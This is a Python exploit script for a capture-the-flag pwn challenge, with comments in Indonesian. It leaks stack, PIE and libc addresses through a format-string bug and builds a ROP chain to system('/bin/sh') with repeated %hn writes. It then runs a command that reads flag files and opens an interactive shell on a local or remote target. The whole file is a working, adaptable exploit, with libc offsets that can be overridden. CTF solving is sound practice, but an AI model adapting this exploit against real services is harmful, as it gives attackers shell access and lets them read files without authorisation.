#!/usr/bin/env python3
import os
import re
import sys
import time
import socket
import struct
import select
import subprocess
from typing import Optional

PROMPT = b"Please provide your input\n"

# Offsets dari binary yang diberikan
ECHO_RET_AFTER_FIRST = 0x121e
LOOP_MAIN_SKIP_PROLOGUE = 0x11d3   # main+4, biar rbp/rsp tidak geser saat loop
PIE_RET_GADGET = 0x1016            # ret; di _init

# Offsets libc lokal challenge. Bisa dioverride kalau remote pakai libc lain:
#   LIBC_RET_OFF=0x... POP_RDI=0x... SYSTEM=0x... BINSH=0x... python3 solve.py REMOTE
LIBC_RET_OFF = int(os.getenv("LIBC_RET_OFF", "0x29ca8"), 0)
POP_RDI      = int(os.getenv("POP_RDI",      "0x2a145"), 0)
SYSTEM       = int(os.getenv("SYSTEM",       "0x53110"), 0)
BINSH        = int(os.getenv("BINSH",        "0x1a5ea4"), 0)

DEFAULT_HOST = os.getenv("HOST", "10.42.5.10")
DEFAULT_PORT = int(os.getenv("PORT", "1337"))
DEFAULT_BIN  = os.getenv("BIN", "./challenge")
DEFAULT_CMD  = os.getenv("CMD", "cat flag* /flag* /home/ctf/flag* 2>/dev/null; id")


def p64(x: int) -> bytes:
    return struct.pack("<Q", x & 0xffffffffffffffff)


def halfwords(x: int):
    # pointer userspace x86-64 cukup 3 halfword bawah; halfword ke-4 tetap 0x0000
    return [(x >> (16 * i)) & 0xffff for i in range(3)]


def write16_payload(addr: int, val: int, idx: int = 8) -> bytes:
    """Satu payload format string: tulis 2 byte val ke addr memakai %idx$hn.
    Address diletakkan di offset 16 supaya menjadi argumen format ke-8.
    """
    val &= 0xffff
    if val == 0:
        fmt = f"%{idx}$hn".encode()
    else:
        fmt = f"%{val}c%{idx}$hn".encode()
    if len(fmt) > 16:
        raise ValueError(f"format terlalu panjang: {fmt!r}")
    payload = fmt.ljust(16, b"A") + p64(addr)
    if len(payload) > 31:
        raise ValueError(f"payload terlalu panjang: {len(payload)}")
    return payload


class Tube:
    def __init__(self, mode: str, host: str, port: int, path: str):
        self.mode = mode
        self.proc: Optional[subprocess.Popen] = None
        self.sock: Optional[socket.socket] = None
        if mode == "local":
            self.proc = subprocess.Popen([path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0)
            self.rfd = self.proc.stdout.fileno()
            self.wfd = self.proc.stdin.fileno()
        else:
            self.sock = socket.create_connection((host, port), timeout=8)
            self.sock.setblocking(False)
            self.rfd = self.sock.fileno()
            self.wfd = self.sock.fileno()

    def send(self, data: bytes):
        if len(data) > 31 and data.startswith(b"%"):
            raise ValueError(f"payload format string >31 bytes: {len(data)}")
        if self.mode == "local":
            os.write(self.wfd, data)
        else:
            assert self.sock is not None
            self.sock.sendall(data)

    def recv_some(self, timeout: float = 1.0) -> bytes:
        end = time.time() + timeout
        out = b""
        while True:
            left = end - time.time()
            if left <= 0:
                break
            r, _, _ = select.select([self.rfd], [], [], left)
            if not r:
                break
            try:
                if self.mode == "local":
                    chunk = os.read(self.rfd, 4096)
                else:
                    assert self.sock is not None
                    chunk = self.sock.recv(4096)
            except BlockingIOError:
                continue
            if not chunk:
                break
            out += chunk
        return out

    def recvuntil(self, token: bytes, limit: int = 25_000_000) -> bytes:
        data = b""
        while token not in data:
            r, _, _ = select.select([self.rfd], [], [], 10)
            if not r:
                raise TimeoutError(f"timeout menunggu {token!r}, data terakhir={data[-200:]!r}")
            if self.mode == "local":
                chunk = os.read(self.rfd, 4096)
            else:
                assert self.sock is not None
                chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError(f"EOF, data terakhir={data[-300:]!r}")
            data += chunk
            if len(data) > limit:
                raise RuntimeError("output terlalu besar; kemungkinan offset salah")
        return data

    def interactive(self):
        print("[*] interactive mode. Ctrl-C untuk keluar.")
        try:
            while True:
                fds = [self.rfd, sys.stdin.fileno()]
                r, _, _ = select.select(fds, [], [])
                if self.rfd in r:
                    if self.mode == "local":
                        data = os.read(self.rfd, 4096)
                    else:
                        assert self.sock is not None
                        data = self.sock.recv(4096)
                    if not data:
                        return
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                if sys.stdin.fileno() in r:
                    data = os.read(sys.stdin.fileno(), 4096)
                    if not data:
                        return
                    self.send(data)
        except KeyboardInterrupt:
            print("\n[*] closed")


def exploit(io: Tube):
    io.recvuntil(PROMPT)

    # Leak: rbp utama, PIE return, dan return address libc dari stack.
    io.send(b"%10$p.%11$p.%13$p.")
    leak_chunk = io.recvuntil(PROMPT)
    m = re.search(rb"(0x[0-9a-fA-F]+)\.(0x[0-9a-fA-F]+)\.(0x[0-9a-fA-F]+)\.", leak_chunk)
    if not m:
        raise RuntimeError(f"gagal parse leak: {leak_chunk[:300]!r}")

    rbp = int(m.group(1), 16)
    pie_ret = int(m.group(2), 16)
    libc_ret = int(m.group(3), 16)

    pie_base = pie_ret - ECHO_RET_AFTER_FIRST
    libc_base = libc_ret - LIBC_RET_OFF
    ret_slot = rbp - 8

    print(f"[+] rbp       = {rbp:#x}")
    print(f"[+] pie_base  = {pie_base:#x}")
    print(f"[+] libc_base = {libc_base:#x}")
    print(f"[+] ret_slot  = {ret_slot:#x}")

    loop_low = (pie_base + LOOP_MAIN_SKIP_PROLOGUE) & 0xffff
    final_ret_low = (pie_base + PIE_RET_GADGET) & 0xffff

    # Echo kedua dari putaran awal: lompat balik ke main+4 agar dapat loop stabil.
    io.send(write16_payload(ret_slot, loop_low))
    io.recvuntil(PROMPT)

    # Chain final akan berada mulai dari [rbp]. Ret slot akan diarahkan ke gadget ret PIE,
    # lalu gadget ret itu mengambil chain[0] dari [rbp].
    chain = [libc_base + POP_RDI, libc_base + BINSH, libc_base + SYSTEM]
    print("[+] chain:")
    print(f"    pop rdi; ret = {chain[0]:#x}")
    print(f"    /bin/sh      = {chain[1]:#x}")
    print(f"    system       = {chain[2]:#x}")

    # Satu loop = echo pertama menulis 1 halfword chain, echo kedua mengembalikan flow ke main+4.
    for q_index, qword in enumerate(chain):
        for h_index, value in enumerate(halfwords(qword)):
            where = rbp + q_index * 8 + h_index * 2
            print(f"[+] write16 {value:#06x} -> {where:#x}")
            io.send(write16_payload(where, value))
            io.recvuntil(PROMPT)  # prompt Field:
            io.send(write16_payload(ret_slot, loop_low))
            io.recvuntil(PROMPT)  # prompt Name: pada loop berikutnya

    print(f"[+] trigger ret gadget low16 = {final_ret_low:#06x}")
    io.send(write16_payload(ret_slot, final_ret_low))

    # Drain output format string dulu supaya command shell tidak ikut termakan read() terakhir.
    drained = io.recv_some(0.6)
    if drained:
        sys.stdout.buffer.write(drained[-1200:])
        sys.stdout.buffer.flush()

    cmd = DEFAULT_CMD.encode() + b"\n"
    print(f"\n[+] sending command: {DEFAULT_CMD}")
    io.send(cmd)
    time.sleep(0.2)
    out = io.recv_some(1.2)
    if out:
        sys.stdout.buffer.write(out)
        sys.stdout.buffer.flush()
        flags = re.findall(rb"[A-Za-z0-9_\-]+\{[^}\r\n ]+\}", out)
        if flags:
            print(f"\n[+] possible flag: {flags[0].decode(errors='replace')}")

    if os.getenv("NO_INTERACTIVE", "0") != "1":
        io.interactive()


def main():
    arg = sys.argv[1].lower() if len(sys.argv) > 1 else "remote"
    if arg in ("local", "l", "--local"):
        mode = "local"
    else:
        mode = "remote"
    host = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_HOST
    port = int(sys.argv[3]) if len(sys.argv) > 3 else DEFAULT_PORT

    print(f"[*] mode={mode}")
    if mode == "remote":
        print(f"[*] target={host}:{port}")
    else:
        print(f"[*] binary={DEFAULT_BIN}")

    io = Tube(mode, host, port, DEFAULT_BIN)
    exploit(io)


if __name__ == "__main__":
    main()
